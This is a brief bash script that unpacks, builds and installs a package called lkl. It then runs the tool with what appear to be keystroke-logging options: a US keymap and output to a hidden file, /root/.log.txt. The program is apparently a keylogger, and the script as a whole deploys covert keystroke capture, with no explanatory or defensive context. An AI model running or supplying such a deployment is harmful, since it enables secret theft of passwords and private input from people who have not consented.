#!/bin/bash

tar -zxvf lkl-0.1.1.tar.gz
cd lkl/
./configure
make install
./lkl
./lkl -l -k keymaps/us_km -o /root/.log.txt
